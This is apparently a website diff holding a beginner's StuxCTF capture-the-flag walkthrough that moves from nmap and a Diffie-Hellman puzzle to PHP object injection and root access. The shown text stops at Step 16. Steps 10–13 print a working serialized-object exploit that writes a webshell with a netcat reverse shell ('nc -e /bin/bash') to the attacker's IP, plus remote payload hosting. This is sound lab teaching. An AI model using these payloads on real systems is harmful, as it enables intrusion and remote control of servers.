+    <li><a href="#web-exploitation">Web Exploitation</a>
+      <ul>
+        <li><a href="#step-6-accessing-the-hidden-directory">Step 6: Accessing the Hidden Directory</a></li>
+        <li><a href="#step-7-discovering-the-lfi-vulnerability">Step 7: Discovering the LFI Vulnerability</a></li>
+        <li><a href="#step-8-analyzing-the-vulnerable-php-code">Step 8: Analyzing the Vulnerable PHP Code</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#step-9-understanding-php-object-injection">Step 9: Understanding PHP Object Injection</a></li>
+        <li><a href="#step-10-creating-the-malicious-payload">Step 10: Creating the Malicious Payload</a></li>
+        <li><a href="#step-11-hosting-the-payload">Step 11: Hosting the Payload</a></li>
+        <li><a href="#step-12-triggering-the-vulnerability">Step 12: Triggering the Vulnerability</a></li>
+        <li><a href="#step-13-getting-a-reverse-shell">Step 13: Getting a Reverse Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-exploitation">Post-Exploitation</a>
+      <ul>
+        <li><a href="#step-14-initial-access-and-user-flag">Step 14: Initial Access and User Flag</a></li>
+        <li><a href="#step-15-privilege-escalation">Step 15: Privilege Escalation</a></li>
+        <li><a href="#step-16-getting-root-access">Step 16: Getting Root Access</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#key-learning-points">Key Learning Points</a>
+      <ul>
+        <li><a href="#for-beginners">For Beginners:</a></li>
+        <li><a href="#security-lessons">Security Lessons:</a></li>
+      </ul>
+    </li>
+    <li><a href="#tools-used">Tools Used</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#initial-reconnaissance">Initial Reconnaissance</a>
+      <ul>
+        <li><a href="#step-1-port-scanning-with-nmap">Step 1: Port Scanning with Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-application-analysis">Web Application Analysis</a>
+      <ul>
+        <li><a href="#step-2-examining-robotstxt">Step 2: Examining robots.txt</a></li>
+        <li><a href="#step-3-investigating-the-main-website">Step 3: Investigating the Main Website</a></li>
+      </ul>
+    </li>
+    <li><a href="#cryptography-challenge">Cryptography Challenge</a>
+      <ul>
+        <li><a href="#step-4-understanding-diffie-hellman-key-exchange">Step 4: Understanding Diffie-Hellman Key Exchange</a></li>
+        <li><a href="#step-5-solving-the-cryptographic-puzzle">Step 5: Solving the Cryptographic Puzzle</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation">Web Exploitation</a>
+      <ul>
+        <li><a href="#step-6-accessing-the-hidden-directory">Step 6: Accessing the Hidden Directory</a></li>
+        <li><a href="#step-7-discovering-the-lfi-vulnerability">Step 7: Discovering the LFI Vulnerability</a></li>
+        <li><a href="#step-8-analyzing-the-vulnerable-php-code">Step 8: Analyzing the Vulnerable PHP Code</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#step-9-understanding-php-object-injection">Step 9: Understanding PHP Object Injection</a></li>
+        <li><a href="#step-10-creating-the-malicious-payload">Step 10: Creating the Malicious Payload</a></li>
+        <li><a href="#step-11-hosting-the-payload">Step 11: Hosting the Payload</a></li>
+        <li><a href="#step-12-triggering-the-vulnerability">Step 12: Triggering the Vulnerability</a></li>
+        <li><a href="#step-13-getting-a-reverse-shell">Step 13: Getting a Reverse Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-exploitation">Post-Exploitation</a>
+      <ul>
+        <li><a href="#step-14-initial-access-and-user-flag">Step 14: Initial Access and User Flag</a></li>
+        <li><a href="#step-15-privilege-escalation">Step 15: Privilege Escalation</a></li>
+        <li><a href="#step-16-getting-root-access">Step 16: Getting Root Access</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#key-learning-points">Key Learning Points</a>
+      <ul>
+        <li><a href="#for-beginners">For Beginners:</a></li>
+        <li><a href="#security-lessons">Security Lessons:</a></li>
+      </ul>
+    </li>
+    <li><a href="#tools-used">Tools Used</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h1 class="relative group">StuxCTF - Complete Beginner&rsquo;s Writeup 
+    <div id="stuxctf---complete-beginners-writeup" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#stuxctf---complete-beginners-writeup" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+<h2 class="relative group">Introduction 
+    <div id="introduction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#introduction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Welcome to this step-by-step walkthrough of the StuxCTF challenge! This writeup is designed for beginners who want to understand each technique used. We&rsquo;ll cover:</p>
+<ul>
+<li>Network reconnaissance with Nmap</li>
+<li>Web enumeration and directory discovery</li>
+<li>Diffie-Hellman cryptography</li>
+<li>Local File Inclusion (LFI) vulnerabilities</li>
+<li>PHP Object Injection attacks</li>
+<li>Privilege escalation</li>
+</ul>
+<p>Let&rsquo;s dive in!</p>
+
+<h2 class="relative group">Initial Reconnaissance 
+    <div id="initial-reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#initial-reconnaissance" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 1: Port Scanning with Nmap 
+    <div id="step-1-port-scanning-with-nmap" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-port-scanning-with-nmap" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>First, we need to discover what services are running on our target machine. We use Nmap (Network Mapper) for this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sCV -T4 10.10.158.14
+</span></span></code></pre></div><p><strong>What this command does:</strong></p>
+<ul>
+<li><code>-sC</code>: Run default scripts for additional information</li>
+<li><code>-V</code>: Version detection to identify service versions</li>
+<li><code>-T4</code>: Timing template (faster scanning)</li>
+</ul>
+<p><strong>Results:</strong></p>
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</code></pre><p><strong>Key findings:</strong></p>
+<ul>
+<li>Port 22: SSH service (for remote login)</li>
+<li>Port 80: Web server running Apache</li>
+<li>The scan also revealed a <code>robots.txt</code> file with a disallowed entry: <code>/StuxCTF/</code></li>
+</ul>
+
+<h2 class="relative group">Web Application Analysis 
+    <div id="web-application-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web-application-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 2: Examining robots.txt 
+    <div id="step-2-examining-robotstxt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-examining-robotstxt" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The <code>robots.txt</code> file often contains interesting information that developers don&rsquo;t want search engines to index:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.158.14/robots.txt
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code># robots.txt generated by StuxCTF
+# Diffie-Hellman
+User-agent: *
+Disallow: 
+Disallow: /StuxCTF/
+</code></pre><p><strong>Important observations:</strong></p>
+<ul>
+<li>There&rsquo;s a hidden directory <code>/StuxCTF/</code></li>
+<li>A comment mentions &ldquo;Diffie-Hellman&rdquo; (a cryptographic algorithm)</li>
+</ul>
+
+<h3 class="relative group">Step 3: Investigating the Main Website 
+    <div id="step-3-investigating-the-main-website" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-investigating-the-main-website" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s look at the source code of the main page:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.158.14/
+</span></span></code></pre></div><p>In the HTML source, we find this hidden comment:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- The secret directory is...
+</span></span></span><span class="line"><span class="cl"><span class="c">p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
+</span></span></span><span class="line"><span class="cl"><span class="c">g: 7;
+</span></span></span><span class="line"><span class="cl"><span class="c">a: 330;
+</span></span></span><span class="line"><span class="cl"><span class="c">b: 450;
+</span></span></span><span class="line"><span class="cl"><span class="c">g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
+</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
+</span></span></code></pre></div><p>This looks like Diffie-Hellman key exchange parameters!</p>
+
+<h2 class="relative group">Cryptography Challenge 
+    <div id="cryptography-challenge" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#cryptography-challenge" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 4: Understanding Diffie-Hellman Key Exchange 
+    <div id="step-4-understanding-diffie-hellman-key-exchange" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-understanding-diffie-hellman-key-exchange" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is Diffie-Hellman?</strong>
+It&rsquo;s a method for two parties to establish a shared secret over an insecure channel. The basic concept involves:</p>
+<ul>
+<li><code>p</code>: A large prime number</li>
+<li><code>g</code>: A generator (base)</li>
+<li><code>a</code> and <code>b</code>: Private keys</li>
+<li><code>g^c</code>: A public key</li>
+</ul>
+<p><strong>The goal:</strong> Calculate the shared secret that represents our hidden directory.</p>
+
+<h3 class="relative group">Step 5: Solving the Cryptographic Puzzle 
+    <div id="step-5-solving-the-cryptographic-puzzle" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-5-solving-the-cryptographic-puzzle" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>I created a Python script to calculate the shared secret:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Given values from the HTML comment</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251</span>
+</span></span><span class="line"><span class="cl"><span class="n">g</span> <span class="o">=</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="mi">330</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="mi">450</span>
+</span></span><span class="line"><span class="cl"><span class="n">gc</span> <span class="o">=</span> <span class="mi">6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Calculate the shared secret</span>
+</span></span><span class="line"><span class="cl"><span class="n">gca</span> <span class="o">=</span> <span class="p">(</span><span class="n">gc</span><span class="o">**</span><span class="n">a</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="n">gcab</span> <span class="o">=</span> <span class="p">(</span><span class="n">gca</span><span class="o">**</span><span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The first 128 characters give us our directory name</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">gcab</span><span class="p">)[:</span><span class="mi">128</span><span class="p">])</span>
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<pre tabindex="0"><code>47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
+</code></pre><p>This long number is our secret directory!</p>
+
+<h2 class="relative group">Web Exploitation 
+    <div id="web-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web-exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 6: Accessing the Hidden Directory 
+    <div id="step-6-accessing-the-hidden-directory" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-6-accessing-the-hidden-directory" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Now we can access the hidden directory using our calculated path:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.158.14/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/
+</span></span></code></pre></div><p><strong>Key findings in the response:</strong></p>
+<ul>
+<li>A hint in the HTML: <code>&lt;!-- hint: /?file= --&gt;</code></li>
+<li>This suggests a Local File Inclusion (LFI) vulnerability</li>
+</ul>
+
+<h3 class="relative group">Step 7: Discovering the LFI Vulnerability 
+    <div id="step-7-discovering-the-lfi-vulnerability" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-7-discovering-the-lfi-vulnerability" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is LFI?</strong>
+Local File Inclusion allows an attacker to include files from the server&rsquo;s filesystem, potentially exposing sensitive information or enabling code execution.</p>
+<p>When we try to include <code>index.php</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://10.10.158.14/[SECRET_DIRECTORY]/?file=index.php&#34;</span>
+</span></span></code></pre></div><p>We get a long hexadecimal string. After decoding this through multiple steps (hex decode → reverse → base64 decode), we discover the PHP source code!</p>
+
+<h3 class="relative group">Step 8: Analyzing the Vulnerable PHP Code 
+    <div id="step-8-analyzing-the-vulnerable-php-code" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-8-analyzing-the-vulnerable-php-code" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The decoded PHP reveals:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">file</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;dump.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;dump test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File no Exist!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$file_name</span><span class="o">==</span><span class="s2">&#34;index.php&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;&lt;?php&#34;</span><span class="p">,</span> <span class="s2">&#34;?&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">nl2br</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="nv">$tags</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)))));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><strong>Critical vulnerability identified:</strong></p>
+<ul>
+<li>The code calls <code>unserialize()</code> on user-controlled input</li>
+<li>There&rsquo;s a <code>file</code> class with a destructor that writes data to a file</li>
+<li>This is a perfect setup for <strong>PHP Object Injection</strong>!</li>
+</ul>
+
+<h2 class="relative group">Exploitation 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 9: Understanding PHP Object Injection 
+    <div id="step-9-understanding-php-object-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-9-understanding-php-object-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is PHP Object Injection?</strong>
+When <code>unserialize()</code> processes malicious data, it can create objects that execute code when they&rsquo;re destroyed (via <code>__destruct()</code> methods).</p>
+<p><strong>Our attack plan:</strong></p>
+<ol>
+<li>Create a malicious serialized object</li>
+<li>Host it on our attack machine</li>
+<li>Make the vulnerable server download and unserialize it</li>
+<li>The destructor will write a PHP webshell to the server</li>
+</ol>
+
+<h3 class="relative group">Step 10: Creating the Malicious Payload 
+    <div id="step-10-creating-the-malicious-payload" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-10-creating-the-malicious-payload" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Create <code>exploit.php</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">file</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;shell.php&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php shell_exec(&#34;nc -e /bin/bash 10.8.181.85 1234&#34;); ?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>Generate the payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php exploit.php &gt; payload.txt
+</span></span></code></pre></div><p><strong>What this creates:</strong></p>
+<ul>
+<li>A serialized object that, when unserialized, will create a <code>shell.php</code> file</li>
+<li>The file contains a reverse shell command using netcat</li>
+</ul>
+
+<h3 class="relative group">Step 11: Hosting the Payload 
+    <div id="step-11-hosting-the-payload" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-11-hosting-the-payload" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Start a simple HTTP server to host our malicious payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">8000</span>
+</span></span></code></pre></div>
+<h3 class="relative group">Step 12: Triggering the Vulnerability 
+    <div id="step-12-triggering-the-vulnerability" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-12-triggering-the-vulnerability" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Visit this URL to make the server download and execute our payload:</p>
+<pre tabindex="0"><code>http://10.10.158.14/[SECRET_DIRECTORY]/?file=http://10.8.181.85:8000/payload.txt
+</code></pre><p><strong>What happens:</strong></p>
+<ol>
+<li>Server downloads our <code>payload.txt</code></li>
+<li><code>unserialize()</code> creates our malicious <code>file</code> object</li>
+<li>When the script ends, <code>__destruct()</code> runs</li>
+<li>Our reverse shell code gets written to <code>shell.php</code></li>
+</ol>
+
+<h3 class="relative group">Step 13: Getting a Reverse Shell 
+    <div id="step-13-getting-a-reverse-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-13-getting-a-reverse-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Start a netcat listener on your machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></div><p>Then trigger the shell by visiting:</p>
+<pre tabindex="0"><code>http://10.10.158.14/[SECRET_DIRECTORY]/shell.php
+</code></pre><p><strong>Success!</strong> We now have a shell as the <code>www-data</code> user.</p>
+
+<h2 class="relative group">Post-Exploitation 
+    <div id="post-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#post-exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Step 14: Initial Access and User Flag 
+    <div id="step-14-initial-access-and-user-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-14-initial-access-and-user-flag" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Once we have our shell, let&rsquo;s explore:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upgrade to a better shell</span>
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check current user</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl"><span class="c1"># Output: www-data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Look for users</span>
+</span></span><span class="line"><span class="cl">ls /home
+</span></span><span class="line"><span class="cl"><span class="c1"># Output: grecia</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Get user flag</span>
+</span></span><span class="line"><span class="cl">cat /home/grecia/user.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># Output: 0b6044b7807dd100b9e30f1bd09db53f</span>
+</span></span></code></pre></div>
+<h3 class="relative group">Step 15: Privilege Escalation 
+    <div id="step-15-privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-15-privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s check what sudo privileges our current user has:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: ALL
+</code></pre><p><strong>This is jackpot!</strong> The <code>www-data</code> user can run ANY command as root without a password.</p>
+
+<h3 class="relative group">Step 16: Getting Root Access 
+    <div id="step-16-getting-root-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-16-getting-root-access" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Switch to root</span>
+</span></span><span class="line"><span class="cl">sudo su
+</span></span><span class="line"><span class="cl">
